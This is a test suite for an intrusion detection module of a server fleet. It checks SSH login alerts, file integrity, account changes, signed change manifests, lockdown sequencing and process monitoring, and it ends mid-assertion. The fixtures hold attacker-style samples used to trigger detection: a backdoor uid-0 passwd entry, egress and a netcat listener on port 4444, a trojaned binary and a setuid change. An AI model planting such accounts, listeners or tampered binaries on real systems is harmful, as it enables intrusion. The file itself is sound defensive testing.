"""deploy/core/ids.py: detectors, expected changes, response state machine,
alert fan-out, peer watch (docs/IDS.md). Everything runs against fakes and
temp trees: no journal, no nft, no systemctl, no network."""

import hashlib
import json
import os
import shutil
import subprocess

import pytest

import ids
import ids_records
import render

REPO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(
    __file__))))
KEY = "node-expect-key-" + os.urandom(8).hex()
FLEET_FP = "SHA256:" + "A" * 43
OTHER_FP = "SHA256:" + "B" * 43


def cfg(tmp_path, **extra):
    base = {
        "node": "n1", "role": "core",
        "state_dir": str(tmp_path / "state"), "run_dir": str(tmp_path / "run"),
        "nodes": ["n1", "n2", "n3"],
        "ssh": {"fleet_fingerprints": [FLEET_FP], "allow": [],
                "foreign_ip_severity": "alert"},
        "severity": {}, "integrity": {}, "processes": {}, "listeners": {},
        "lockdown": {"stop_units": ["forkmesh-app.service", "caddy.service"],
                     "rqlite_unit": "rqlite.service",
                     "core_wg_ips": ["10.77.0.1", "10.77.0.2", "10.77.0.3"],
                     "core_wg_ips_by_node": {"n1": "10.77.0.1",
                                             "n2": "10.77.0.2",
                                             "n3": "10.77.0.3"},
                     "core_public_ips": ["198.51.100.1", "198.51.100.2",
                                         "198.51.100.3"]},
        "heartbeat": {"stale_ms": 180_000},
    }
    base.update(extra)
    return base


def sshd(message, ident="sshd-session"):
    return {"SYSLOG_IDENTIFIER": ident, "MESSAGE": message}


def accepted(fp=FLEET_FP, ip="203.0.113.9", port=50000, user="root",
             method="publickey"):
    return sshd("Accepted %s for %s from %s port %d ssh2: ED25519 %s"
                % (method, user, ip, port, fp))


def session(kind, ip="203.0.113.9", port=50000, user="root"):
    return sshd("Starting session: %s for %s from %s port %d id 0"
                % (kind, user, ip, port))


def codes(events):
    return [(e["detector"], e["severity"]) for e in events]


# --------------------------------------------------------------------------
# SSH


def test_fleet_tool_sessions_are_info(tmp_path):
    ssh = ids.SshMonitor(cfg(tmp_path))
    assert ssh.feed(accepted()) == []
    assert codes(ssh.feed(session("command"))) == [("ssh_tool_session", "info")]
    ssh.feed(accepted(port=50001))
    assert codes(ssh.feed(session("subsystem 'sftp'", port=50001))) == [
        ("ssh_tool_session", "info")]


def test_interactive_login_alerts_unless_allowlisted(tmp_path):
    ssh = ids.SshMonitor(cfg(tmp_path))
    ssh.feed(accepted())
    assert codes(ssh.feed(session("shell on pts/0"))) == [
        ("ssh_interactive_login", "alert")]
    ssh.feed(accepted(port=50002))
    assert codes(ssh.feed(session("command on pts/1", port=50002))) == [
        ("ssh_interactive_login", "alert")]
    allowed = ids.SshMonitor(cfg(tmp_path, ssh={
        "fleet_fingerprints": [FLEET_FP], "allow": ["203.0.113.0/24"]}))
    assert allowed.feed(accepted()) == []
    assert codes(allowed.feed(session("shell on pts/0"))) == [
        ("ssh_interactive_login", "info")]


def test_unknown_key_password_and_foreign_ip(tmp_path):
    ssh = ids.SshMonitor(cfg(tmp_path, ssh={
        "fleet_fingerprints": [FLEET_FP], "allow": ["192.0.2.0/24"],
        "foreign_ip_severity": "alert"}))
    assert codes(ssh.feed(accepted(fp=OTHER_FP))) == [
        ("ssh_unknown_key", "lockdown"), ("ssh_foreign_ip", "alert")]
    assert ("ssh_non_key_login", "lockdown") in codes(ssh.feed(accepted(
        method="password", ip="192.0.2.4")))
    assert ("ssh_login_user", "alert") in codes(ssh.feed(accepted(
        user="linuxuser", ip="192.0.2.4", port=1)))
    # Journald lines from other programs are ignored.
    assert ssh.feed({"SYSLOG_IDENTIFIER": "cron", "MESSAGE": "Accepted "
                     "publickey for root from 1.2.3.4 port 1"}) == []


def test_no_fingerprints_configured_turns_the_key_check_off(tmp_path):
    ssh = ids.SshMonitor(cfg(tmp_path, ssh={"fleet_fingerprints": []}))
    assert ssh.feed(accepted(fp=OTHER_FP)) == []


# --------------------------------------------------------------------------
# kernel, account tools


def test_kernel_egress_log_and_taint():
    line = {"_TRANSPORT": "kernel", "MESSAGE": "fmnext-ids-egress: IN= "
            "OUT=eth0 SRC=198.51.100.1 DST=203.0.113.50 LEN=60 PROTO=TCP "
            "SPT=40000 DPT=4444 UID=0 GID=0"}
    events = ids.parse_kernel(line)
    assert codes(events) == [("egress_unexpected", "alert")]
    assert events[0]["detail"]["port"] == "4444"
    assert events[0]["detail"]["dst"] == "203.0.113.50"
    taint = {"_TRANSPORT": "kernel", "MESSAGE": "evil: loading out-of-tree "
             "module taints kernel."}
    assert codes(ids.parse_kernel(taint)) == [("kernel_module_taint", "alert")]
    assert ids.parse_kernel({"_TRANSPORT": "journal", "MESSAGE": "x"}) == []


def test_account_tools():
    assert codes(ids.parse_account_tool({"SYSLOG_IDENTIFIER": "sudo",
                                          "MESSAGE": "x : TTY=pts/0"})) == [
        ("privilege_tool", "alert")]
    assert codes(ids.parse_account_tool({"SYSLOG_IDENTIFIER": "useradd",
                                          "MESSAGE": "new user"})) == [
        ("account_tool", "info")]


def test_root_dropping_privilege_is_info_but_escalation_alerts():
    def su(message):
        return codes(ids.parse_account_tool({"SYSLOG_IDENTIFIER": "su",
                                             "MESSAGE": message}))
    # The operator tools' `su -s /bin/sh forkmesh-node -c ...` (r1, 2026-09-24).
    for line in (
            "pam_unix(su:session): session opened for user forkmesh-node(uid=999) by root(uid=0)",
            "(to root) root on none",
            "pam_unix(su:session): session opened for user root(uid=0) by root(uid=0)",
            "pam_unix(su:session): session closed for user root"):
        assert su(line) == [("privilege_tool_root", "info")], line
    assert codes(ids.parse_account_tool({
        "SYSLOG_IDENTIFIER": "sudo",
        "MESSAGE": "    root : PWD=/ ; USER=forkmesh-node ; COMMAND=/bin/true"})) == [
        ("privilege_tool_root", "info")]
    # A non-root account gaining root still alerts.
    assert su("pam_unix(su:session): session opened for user root(uid=0) by "
              "forkmesh-job(uid=998)") == [("privilege_tool", "alert")]
    assert su("(to root) forkmesh-job on pts/0") == [("privilege_tool", "alert")]
    assert su("FAILED SU (to root) forkmesh-job on pts/0") == [
        ("privilege_tool", "alert")]
    assert su("pam_unix(su:auth): authentication failure; logname= uid=998 "
              "euid=0 tty=pts/0 ruser=forkmesh-job rhost=  user=root") == [
        ("privilege_tool", "alert")]


# --------------------------------------------------------------------------
# accounts


PASSWD = "root:x:0:0:root:/root:/bin/bash\nforkmesh-app:x:998:998::/nonexistent:/usr/sbin/nologin\n"  # forkmesh-secret-scan:ignore-line
GROUP = "root:x:0:\nsudo:x:27:\nforkmesh-app:x:998:\n"


def test_account_diffs():
    old = {"passwd": PASSWD, "group": GROUP, "shadow": "root:*:1::::::\n"}
    events = ids.diff_accounts(old, {"passwd": PASSWD + "evil:x:0:0::/:/bin/sh\n"})
    assert codes(events) == [("account_uid0", "lockdown")]
    events = ids.diff_accounts(old, {"passwd": PASSWD + "svc:x:990:990::/:/bin/bash\n"})
    assert codes(events) == [("account_login_shell", "lockdown")]
    events = ids.diff_accounts(old, {"passwd": PASSWD + "svc:x:990:990::/:/usr/sbin/nologin\n"})
    assert codes(events) == [("account_added", "alert")]
    events = ids.diff_accounts(old, {"group": GROUP.replace("sudo:x:27:", "sudo:x:27:forkmesh-app")})
    assert codes(events) == [("group_privileged", "lockdown")]
    events = ids.diff_accounts(old, {"shadow": "root:$6$abc$def:1::::::\n"})
    assert codes(events) == [("root_password_set", "lockdown")]
    events = ids.diff_accounts(old, {"shadow": "root:!*:1::::::\n"})
    assert codes(events) == [("shadow_changed", "alert")]


# --------------------------------------------------------------------------
# integrity + expected changes


def make_tree(root):
    for path, text in {
            "/usr/local/bin/rqlited": "binary-1",
            "/etc/systemd/system/app.service": "[Service]\n",
            "/etc/forkmesh-next/app.env": "A=1\n",
            "/etc/forkmesh-next/tls/cert.pem": "cert",
            "/opt/forkmesh-next/app/releases/aaa/app.py": "print(1)\n",
            "/opt/forkmesh-next/app/releases/bbb/app.py": "print(2)\n",
            "/etc/passwd": PASSWD, "/etc/group": GROUP,
            "/root/.ssh/authorized_keys": "ssh-ed25519 AAAA fleet\n"}.items():
        target = root / path.lstrip("/")
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)
    link = root / "opt/forkmesh-next/app/current"
    os.symlink("/opt/forkmesh-next/app/releases/aaa", link)
    # The symlink points at the real path; in the temp tree resolve it there.
    os.unlink(link)
    os.symlink(str(root / "opt/forkmesh-next/app/releases/aaa"), link)


def integrity_cfg(tmp_path):
    return cfg(tmp_path, integrity={
        "lockdown": ["/usr/local/bin", "/etc/systemd/system", "/etc/passwd",
                     "/etc/group"],
        "alert": ["/etc/forkmesh-next"],
        "trees": ["/opt/forkmesh-next/app/current"],
        "hot": ["/etc/passwd", "/etc/group"],
        "exclude": ["/etc/forkmesh-next/tls", "/etc/forkmesh-next/tls/*"],
        "authorized_keys": True})


def scan_changes(integrity, baseline, group="all"):
    current = integrity.scan(group, rehash=True)
    return current, ids.compare(baseline, current, lambda p: True)


def test_integrity_scan_classifies_and_detects(tmp_path):
    root = tmp_path / "fs"
    make_tree(root)
    integrity = ids.Integrity(integrity_cfg(tmp_path), root_prefix=str(root))
    baseline = integrity.scan("all")
    assert "/usr/local/bin/rqlited" in baseline
    assert "/root/.ssh/authorized_keys" in baseline
    assert "/etc/forkmesh-next/tls/cert.pem" not in baseline  # excluded
    assert any(p.endswith("/releases/aaa/app.py") for p in baseline)
    (root / "usr/local/bin/rqlited").write_text("binary-evil")
    (root / "etc/forkmesh-next/app.env").write_text("A=2\n")
    (root / "root/.ssh/authorized_keys").write_text("ssh-ed25519 AAAA evil\n")
    _, changes = scan_changes(integrity, baseline)
    events, accepted = ids.change_events(integrity, changes,
                                         ids.Expectations(str(tmp_path / "e")),
                                         {}, {})
    assert accepted == []
    by_path = {e["detail"]["path"]: e["severity"] for e in events}
    assert by_path == {"/usr/local/bin/rqlited": "lockdown",
                       "/etc/forkmesh-next/app.env": "alert",
                       "/root/.ssh/authorized_keys": "lockdown"}


def test_setuid_bit_is_a_lockdown(tmp_path):
    root = tmp_path / "fs"
    make_tree(root)
    integrity = ids.Integrity(integrity_cfg(tmp_path), root_prefix=str(root))
    baseline = integrity.scan("all")
    os.chmod(root / "etc/forkmesh-next/app.env", 0o4755)
    _, changes = scan_changes(integrity, baseline)
    events, _ = ids.change_events(integrity, changes, None, {}, {})
    assert codes(events) == [("integrity_permissions", "lockdown")]


def test_symlink_in_systemd_dir_is_only_an_alert(tmp_path):
    root = tmp_path / "fs"
    make_tree(root)
    integrity = ids.Integrity(integrity_cfg(tmp_path), root_prefix=str(root))
    baseline = integrity.scan("all")
    wants = root / "etc/systemd/system/multi-user.target.wants"
    wants.mkdir()
    os.symlink("/etc/systemd/system/app.service", wants / "app.service")
    (root / "etc/systemd/system/evil.service").write_text("[Service]\n")
    _, changes = scan_changes(integrity, baseline)
    events, _ = ids.change_events(integrity, changes, None, {}, {})
    severities = {e["detail"]["path"]: e["severity"] for e in events}
    assert severities["/etc/systemd/system/multi-user.target.wants/"
                      "app.service"] == "alert"
    assert severities["/etc/systemd/system/evil.service"] == "lockdown"


def signed_manifest(key=KEY, node="n1", files=None, rescan=(), allow=(),
                    now=None, minutes=15):
    import next_ids
    return next_ids.build_manifest(node, key, files, rescan, allow,
                                   "test", minutes, now_ms=now)


def test_expected_changes_are_accepted_exact_and_rescan(tmp_path):
    root = tmp_path / "fs"
    make_tree(root)
    integrity = ids.Integrity(integrity_cfg(tmp_path), root_prefix=str(root))
    baseline = integrity.scan("all")
    expectations = ids.Expectations(str(tmp_path / "expect"))
    new_binary = b"binary-2"
    expectations.add(signed_manifest(files={
        "/usr/local/bin/rqlited": hashlib.sha256(new_binary).hexdigest(),
        "/opt/forkmesh-next/app/current": "link:%s/*" % (
            root / "opt/forkmesh-next/app/releases")},
        rescan=[str(root / "opt/forkmesh-next/app/releases").replace(
            str(root), "")]))
    (root / "usr/local/bin/rqlited").write_bytes(new_binary)
    link = root / "opt/forkmesh-next/app/current"
    os.unlink(link)
    os.symlink(str(root / "opt/forkmesh-next/app/releases/bbb"), link)
    _, changes = scan_changes(integrity, baseline)
    events, accepted = ids.change_events(integrity, changes, expectations,
                                         {}, {})
    assert events == []
    assert "/usr/local/bin/rqlited" in accepted
    assert "/opt/forkmesh-next/app/current" in accepted


def test_expected_file_with_other_content_is_still_an_incident(tmp_path):
    root = tmp_path / "fs"
    make_tree(root)
    integrity = ids.Integrity(integrity_cfg(tmp_path), root_prefix=str(root))
    baseline = integrity.scan("all")
    expectations = ids.Expectations(str(tmp_path / "expect"))
    expectations.add(signed_manifest(files={
        "/usr/local/bin/rqlited": hashlib.sha256(b"binary-2").hexdigest()}))
    (root / "usr/local/bin/rqlited").write_bytes(b"binary-trojan")
    _, changes = scan_changes(integrity, baseline)
    events, _ = ids.change_events(integrity, changes, expectations, {}, {})
    assert codes(events) == [("integrity_modified", "lockdown")]
    assert events[0]["detail"]["expected"] == "different content"


def test_account_changes_are_diffed_and_users_window_accepts(tmp_path):
    root = tmp_path / "fs"
    make_tree(root)
    integrity = ids.Integrity(integrity_cfg(tmp_path), root_prefix=str(root))
    baseline = integrity.scan("all")
    before = integrity.read_account_files(list(ids.ACCOUNT_FILES))
    with open(root / "etc/passwd", "a") as handle:
        handle.write("evil:x:0:0::/:/bin/sh\n")
    _, changes = scan_changes(integrity, baseline)
    after = integrity.read_account_files([p for p, _, _ in changes])
    events, _ = ids.change_events(integrity, changes, None, before, after)
    assert codes(events) == [("account_uid0", "lockdown")]
    window = ids.Expectations(str(tmp_path / "expect"))
    window.add(signed_manifest(allow=["users"]))
    events, accepted = ids.change_events(integrity, changes, window, before,
                                         after)
    assert events == [] and "/etc/passwd" in accepted


def test_manifest_hmac_is_required(tmp_path):
    now = ids.now_ms()
    good = signed_manifest(now=now)
    assert ids.verify_manifest(good, KEY, "n1", now, {}) is None
    # Forged: another key (e.g. another node's), tampered, wrong node,
    # replayed, stale, too long, no key on the node.
    assert ids.verify_manifest(signed_manifest(key="other"), KEY, "n1", now,
                               {}) == "bad_mac"
    tampered = dict(good, rescan=["/"])
    assert ids.verify_manifest(tampered, KEY, "n1", now, {}) == "bad_mac"
    assert ids.verify_manifest(signed_manifest(node="n2"), KEY, "n1", now,
                               {}) == "wrong_node"
    assert ids.verify_manifest(good, KEY, "n1", now,
                               {good["nonce"]: 1}) == "replayed"
    old = signed_manifest(now=now - 20 * 60_000)
    assert ids.verify_manifest(old, KEY, "n1", now, {}) == "stale"
    long_window = signed_manifest(now=now)
    long_window["expires_ms"] = now + 2 * 3600_000
    long_window["mac"] = ids.manifest_mac(KEY, long_window)
    assert ids.verify_manifest(long_window, KEY, "n1", now, {}) == "stale"
    assert ids.verify_manifest(good, "", "n1", now, {}) == "no_key"
    unsigned = {k: v for k, v in good.items() if k != "mac"}
    assert ids.verify_manifest(unsigned, KEY, "n1", now, {}) == "bad_mac"


class FakeActions:
    def __init__(self):
        self.calls = []
        self.present = True

    def seal_app(self):
        self.calls.append(("seal",))
        return True, "sealed"

    def firewall(self, text):
        self.calls.append(("firewall", text))
        return True, ""

    def stop_units(self, units):
        self.calls.append(("stop", tuple(units)))
        return True, ""

    def start_units(self, units):
        self.calls.append(("start", tuple(units)))
        return True, ""

    def kill_jobs(self):
        self.calls.append(("kill_jobs",))
        return True, ""

    def names(self):
        return [c[0] for c in self.calls]


class FakeAlerter:
    def __init__(self):
        self.sent = []
        self.recorded = []
        self.posted = []

    def send(self, incident, key=""):
        self.sent.append(dict(incident))
        return {"journal": (True, "logged")}

    def record(self, incident):
        self.recorded.append(dict(incident))
        return True, "recorded"

    def post_runner(self, incident):
        self.posted.append(dict(incident))
        return True, "api"


class FakeRqlite:
    def __init__(self, nodes=None):
        self.statements = []
        self._nodes = nodes or []
        self.tables = {"cluster_members": [], "ids_heartbeats": [],
                       "cluster_quarantine": []}
        self.removed = []

    def execute(self, statements, local_only=False):
        self.statements.extend(statements)
        for statement in statements:
            if statement[0].startswith(ids_records.INSERT_SQL[:30]):
                row = dict(zip(("id", "node_id", "kind", "signer",
                                "created_ms", "body", "sig"), statement[1:]))
                row["reunsealed_ms"] = None
                self.tables["cluster_quarantine"].append(row)
        return [{}]

    def query(self, sql, *params, level="weak"):
        for table, rows in self.tables.items():
            if "FROM %s" % table in sql:
                return list(rows)
        return []

    def nodes(self):
        return self._nodes

    def remove(self, node_id):
        self.removed.append(node_id)


def responder(tmp_path, role="core", rqlite=None, signer=None, **extra):
    config = cfg(tmp_path, role=role, **extra)
    os.makedirs(config["state_dir"], exist_ok=True)
    actions, alerter = FakeActions(), FakeAlerter()
    store = ids.StateStore(os.path.join(config["state_dir"], "state.json"))
    r = ids.Responder(config, actions, alerter, store, KEY, signer, rqlite)
    return r, actions, alerter


VOTERS_OK = [{"id": "n1", "voter": True, "reachable": True, "leader": False},
             {"id": "n2", "voter": True, "reachable": True, "leader": True},
             {"id": "n3", "voter": True, "reachable": True, "leader": False}]


def test_alert_is_sent_and_deduplicated(tmp_path):
    r, actions, alerter = responder(tmp_path)
    event = ids.Event("listener_unexpected", "alert", "nc listens on 4444")
    incident = r.handle(event)
    assert incident["severity"] == "alert" and len(alerter.sent) == 1
    assert r.handle(ids.Event("listener_unexpected", "alert",
                              "nc listens on 4444")) is None
    assert len(alerter.sent) == 1 and not r.lockdown
    assert actions.calls == []


def test_severity_override(tmp_path):
    r, actions, _ = responder(tmp_path, severity={
        "listener_unexpected": "lockdown"}, rqlite=None)
    r.rqlite = FakeRqlite(VOTERS_OK)
    r.handle(ids.Event("listener_unexpected", "alert", "x"))
    assert r.lockdown


def test_core_lockdown_sequence(tmp_path):
    private = ids_records.generate_private()
    rq = FakeRqlite(VOTERS_OK)
    r, actions, alerter = responder(tmp_path, rqlite=rq,
                                    signer=lambda: private)
    incident = r.handle(ids.Event("ssh_unknown_key", "lockdown",
                                  "unknown key"))
    assert r.lockdown and os.path.exists(r.marker)
    # Seal first; rqlite is stopped (two other voters reachable with a
    # leader); then the firewall and the services.
    assert actions.names() == ["seal", "stop", "firewall", "stop"]
    assert actions.calls[1] == ("stop", ("rqlite.service",))
    assert actions.calls[3] == ("stop", ("forkmesh-app.service",
                                         "caddy.service"))
    assert os.path.exists(r.rqlite_marker)
    firewall = actions.calls[2][1]
    assert "meta skuid != 0 counter drop" in firewall
    assert "tcp dport 4002" not in firewall  # rqlite stopped: no Raft
    # A signed self-quarantine row, verifiable with the node's public key.
    rows = rq.tables["cluster_quarantine"]
    assert len(rows) == 1
    keys = {"n1": ids_records.public_key(private)}
    state = ids_records.quarantine_state(rows, keys, "", ["n1", "n2", "n3"])
    assert state["n1"]["quarantined"]
    assert alerter.recorded[0]["id"] == incident["id"]
    assert alerter.sent[-1]["detail"]["lockdown"]["seal"][0] is True
    # A second lockdown event is just an incident now.
    r.handle(ids.Event("ptrace", "lockdown", "another"))
    assert actions.names().count("seal") == 1


@pytest.mark.parametrize("nodes,reason", [
    ([{"id": "n1", "voter": True, "reachable": True},
      {"id": "n2", "voter": True, "reachable": True, "leader": True},
      {"id": "n3", "voter": True, "reachable": False}], "1 other"),
    ([{"id": "n1", "voter": True, "reachable": True},
      {"id": "n2", "voter": True, "reachable": True},
      {"id": "n3", "voter": True, "reachable": True}], "no leader"),
    ([{"id": "n%d" % i, "voter": True, "reachable": i < 4, "leader": i == 2}
      for i in range(1, 5)], "2 of 4"),
])
def test_lockdown_keeps_rqlite_when_quorum_needs_it(tmp_path, nodes, reason):
    r, actions, _ = responder(tmp_path, rqlite=FakeRqlite(nodes))
    r.handle(ids.Event("ssh_unknown_key", "lockdown", "x"))
    assert ("stop", ("rqlite.service",)) not in actions.calls
    assert not os.path.exists(r.rqlite_marker)
    firewall = [c for c in actions.calls if c[0] == "firewall"][0][1]
    assert "tcp dport 4002 accept" in firewall  # Raft stays up


def test_lockdown_stops_rqlite_when_the_others_are_a_majority_of_four(tmp_path):
    nodes = [{"id": "n%d" % i, "voter": True, "reachable": True, "leader": i == 2}
             for i in range(1, 5)]
    r, actions, _ = responder(tmp_path, rqlite=FakeRqlite(nodes))
    r.handle(ids.Event("ssh_unknown_key", "lockdown", "x"))
    assert ("stop", ("rqlite.service",)) in actions.calls


def test_lockdown_keeps_rqlite_when_another_node_is_quarantined(tmp_path):
    r, actions, _ = responder(tmp_path, rqlite=FakeRqlite(VOTERS_OK))
    r.state["quarantined"] = ["n3"]
    r.handle(ids.Event("ssh_unknown_key", "lockdown", "x"))
    assert ("stop", ("rqlite.service",)) not in actions.calls


def test_runner_lockdown(tmp_path):
    r, actions, alerter = responder(tmp_path, role="runner", lockdown={
        "stop_units": ["forkmesh-mirror-node.service"]})
    r.handle(ids.Event("job_user_outside_scope", "lockdown", "escape"))
    assert r.lockdown
    # Jobs die first, the report (which revokes the runner) goes out before
    # egress is blocked, then the daemon stops. No seal, no rqlite.
    assert actions.names() == ["kill_jobs", "firewall", "stop"]
    assert len(alerter.sent) == 1 and alerter.sent[0]["severity"] == "lockdown"
    assert "wg0" not in actions.calls[1][1]


def test_lockdown_survives_a_restart_and_needs_a_signed_release(tmp_path):
    operator = ids_records.generate_private()
    operator_pub = ids_records.public_key(operator)
    rq = FakeRqlite(VOTERS_OK)
    r, actions, _ = responder(tmp_path, rqlite=rq)
    r.handle(ids.Event("ssh_unknown_key", "lockdown", "x"))
    # A new process (restart, reboot) comes back locked down.
    again, actions2, _ = responder(tmp_path, rqlite=rq)
    assert again.lockdown
    again.reassert()
    assert "meta skuid != 0 counter drop" in actions2.calls[0][1]
    assert ("stop", ("forkmesh-app.service", "caddy.service")) in actions2.calls
    # A release signed by anyone but the operator is refused.
    forged_key = ids_records.generate_private()
    body = ids_records.release_body("n1", ids.now_ms(), [], "abcd1234")
    forged = ids_records.make_row("release", "n1", "operator", body,
                                  ids_records.sign(forged_key, "release",
                                                   body))
    ok, _ = again.release(forged, operator_pub)
    assert not ok and again.lockdown
    other = ids_records.make_row("release", "n2", "operator", dict(
        body, node="n2"), ids_records.sign(operator, "release",
                                           dict(body, node="n2")))
    assert not again.release(other, operator_pub)[0]
    good = ids_records.make_row("release", "n1", "operator", body,
                                ids_records.sign(operator, "release", body))
    ok, note = again.release(good, operator_pub)
    assert ok and not again.lockdown and not os.path.exists(again.marker)
    assert not os.path.exists(again.rqlite_marker)
    started = [c for c in actions2.calls if c[0] == "start"][0][1]
    assert started[0] == "rqlite.service" and "forkmesh-app.service" in started
    assert "meta skuid != 0" not in [c for c in actions2.calls
                                     if c[0] == "firewall"][-1][1]


# --------------------------------------------------------------------------
# firewall


def nft():
    for path in (os.environ.get("FMNEXT_NFT"), "/usr/sbin/nft", "/sbin/nft",
                 shutil.which("nft")):
        if path and os.path.exists(path):
            return path if shutil.which("unshare") else None
    return None


@pytest.mark.skipif(nft() is None, reason="no nft")
@pytest.mark.parametrize("lockdown,allow,raft", [
    (False, (), False), (True, (), False), (True, ("203.0.113.0/24",), True)])
def test_firewall_ruleset_parses(tmp_path, lockdown, allow, raft):
    text = ids.firewall_ruleset(
        blocked=["10.77.0.3"], lockdown=lockdown, ssh_allow=allow,
        keep_raft=raft, core_wg_ips=["10.77.0.1", "10.77.0.2"],
        core_public_ips=["198.51.100.1"], dns_uid=65534,
        rqlite_user="nobody")
    path = tmp_path / "ids.nft"
    path.write_text(text)
    result = subprocess.run(["unshare", "-rn", nft(), "-c", "-f", str(path)],
                            capture_output=True, text=True)
    assert result.returncode == 0, result.stderr


def test_firewall_contents():
    normal = ids.firewall_ruleset(blocked=["10.77.0.3"])
    assert "ip saddr @blocked drop" in normal and "ip daddr @blocked drop" \
        in normal
    assert "counter drop" not in normal and "skuid" not in normal
    locked = ids.firewall_ruleset(lockdown=True, ssh_allow=["192.0.2.1"])
    assert locked.index("tcp dport 22 ip saddr != @ssh_allow drop") < \
        locked.index("ct state established,related accept")
    open_ssh = ids.firewall_ruleset(lockdown=True)
    assert "tcp dport 22 accept" in open_ssh and "ssh_allow" not in open_ssh
    moved = ids.firewall_ruleset(lockdown=True, ssh_allow=["192.0.2.1"],
                                 ssh_port=822)
    assert "tcp dport 822 ip saddr != @ssh_allow drop" in moved
    assert "tcp dport 822 accept" in moved and "dport 22 " not in moved


# --------------------------------------------------------------------------
# processes and listeners


def fake_proc(root, pid, uid, exe, unit, tracer=0, name="x"):
    d = root / str(pid)
    d.mkdir(parents=True)
    (d / "status").write_text("Name:\t%s\nPPid:\t1\nTracerPid:\t%d\n"
                              "Uid:\t%d\t%d\t%d\t%d\n" % (name, tracer, uid,
                                                          uid, uid, uid))
    (d / "cgroup").write_text("0::/system.slice/%s\n" % unit)
    os.symlink(exe, d / "exe")


PROC_CFG = {"processes": {
    "service_users": {
        "forkmesh-app": {"units": ["forkmesh-app.service"],
                         "exe": ["/usr/bin/python3*"]},
        "forkmesh-node": {"units": ["forkmesh-mirror-node.service"],
                          "exe": ["/usr/local/bin/forkmesh-mirror-node"],
                          "shell_severity": "alert"}},
    "job_user": "forkmesh-job",
    "job_units": ["fmnext-job-*.scope", "run-*.scope"],
    "protected_units": ["forkmesh-app.service"]}}
USERS = {0: "root", 998: "forkmesh-app", 997: "forkmesh-node",
         996: "forkmesh-job"}


def proc_monitor(tmp_path):
    return ids.ProcessMonitor(dict(cfg(tmp_path), **PROC_CFG),
                              proc=str(tmp_path / "proc"),
                              user_of=lambda uid: USERS.get(uid, str(uid)))


def test_process_rules(tmp_path):
    proc = tmp_path / "proc"
    fake_proc(proc, 10, 998, "/usr/bin/python3.13", "forkmesh-app.service")
    fake_proc(proc, 11, 998, "/usr/bin/bash", "forkmesh-app.service")
    fake_proc(proc, 12, 998, "/usr/bin/python3.13", "cron.service")
    fake_proc(proc, 13, 997, "/usr/bin/dash", "forkmesh-mirror-node.service")
    fake_proc(proc, 14, 0, "/dev/shm/.x (deleted)", "ssh.service")
    fake_proc(proc, 15, 996, "/usr/bin/bash", "fmnext-job-00ff.scope")
    fake_proc(proc, 16, 996, "/usr/bin/bash", "cron.service")
    fake_proc(proc, 17, 0, "/usr/bin/gdb", "session-4.scope")
    fake_proc(proc, 18, 998, "/usr/bin/python3.13", "forkmesh-app.service",
              tracer=17)
    fake_proc(proc, 19, 0, "/usr/bin/python3.13 (deleted)", "fmnext-ids.service")
    events = proc_monitor(tmp_path).scan()
    found = sorted((e["detail"]["pid"], e["detector"], e["severity"])
                   for e in events)
    assert found == [
        (11, "service_user_shell", "lockdown"),
        (12, "service_user_outside_unit", "lockdown"),
        (13, "service_user_shell", "alert"),
        (14, "exe_suspicious_path", "lockdown"),
        (16, "job_user_outside_scope", "lockdown"),
        (18, "ptrace", "lockdown"),
    ]
    # An operator's announced debugging window (next_ids.py expect --allow
    # ptrace) turns the ptrace into info.
    events = proc_monitor(tmp_path).scan(allow_ptrace=True)
    assert ("ptrace", "info") in codes(events)


NODE_CFG = {"processes": {
    "service_users": {
        "forkmesh-node": {"units": ["forkmesh-mirror-node.service"],
                          "exe": ["/usr/local/bin/forkmesh-mirror-node",
                                  "/usr/bin/git", "/usr/lib/git-core/*",
                                  "/usr/bin/bwrap"],
                          "shell_severity": "alert"}}}}
MIRROR = "forkmesh-mirror-node.service"


def rich_proc(root, pid, exe, argv, ppid=1, uid=997, unit=MIRROR, cwd=None,
              env=None, rootfs=None, name=None):
    fake_proc(root, pid, uid, exe, unit, name=name or os.path.basename(exe))
    d = root / str(pid)
    status = d / "status"
    status.write_text(status.read_text().replace("PPid:\t1", "PPid:\t%d" % ppid))
    (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in argv) + b"\0")
    if cwd:
        os.symlink(cwd, d / "cwd")
    if rootfs:
        os.symlink(rootfs, d / "root")
    if env:
        (d / "environ").write_bytes(b"\0".join(
            ("%s=%s" % kv).encode() for kv in env.items()) + b"\0")
    return d


def node_monitor(tmp_path):
    return ids.ProcessMonitor(dict(cfg(tmp_path), **NODE_CFG),
                              proc=str(tmp_path / "proc"),
                              user_of=lambda uid: USERS.get(uid, str(uid)))


def shell_event(events, pid):
    [event] = [e for e in events if e["detector"] == "service_user_shell"
               and e["detail"]["pid"] == pid]
    return event


def push_hook(tmp_path, body):
    proc, rootfs = tmp_path / "proc", tmp_path / "rootfs"
    hooks = rootfs / "srv" / "a.git" / "hooks"
    hooks.mkdir(parents=True)
    if body is None:
        os.mkfifo(hooks / "post-receive")
    else:
        (hooks / "post-receive").write_bytes(body)
    rich_proc(proc, 39, "/usr/local/bin/forkmesh-mirror-node",
              ["/usr/local/bin/forkmesh-mirror-node", "--config", "x.json"])
    rich_proc(proc, 40, "/usr/lib/git-core/git",
              ["git-receive-pack", "--stateless-rpc", "/srv/a.git"], ppid=39)
    rich_proc(proc, 41, "/usr/bin/dash", ["/bin/sh", "hooks/post-receive"],
              ppid=40, cwd="/srv/a.git", rootfs=str(rootfs), name="sh")
    rich_proc(proc, 42, "/usr/bin/curl",
              ["/usr/bin/curl", "-fsS", "-X", "POST",
               "http://127.0.0.1:8791/v1/control/sync?local=1"], ppid=41)
    return shell_event(node_monitor(tmp_path).scan(), 41)


def test_forkmesh_push_hook_shell_says_it_is_likely_benign(tmp_path):
    event = push_hook(tmp_path, b"#!/bin/sh\n# Managed-By: ForkMesh "
                                b"mirror-node\nexit 0\n")
    assert event["severity"] == "alert"
    assert event["summary"] == (
        "forkmesh-node runs dash (pid 41); likely benign: ForkMesh's own "
        "post-receive hook during a git push")
    detail = event["detail"]
    assert detail["verdict"].startswith(
        "Likely benign. This is ForkMesh's own post-receive hook "
        "(/srv/a.git/hooks/post-receive, it carries ForkMesh's marker), "
        "run by git receive-pack (pid 40)")
    assert detail["cmdline"] == "/bin/sh hooks/post-receive"
    assert detail["cwd"] == "/srv/a.git" and detail["ppid"] == 40
    assert detail["parents"] == [
        "pid 40 /usr/lib/git-core/git as forkmesh-node: git-receive-pack "
        "--stateless-rpc /srv/a.git",
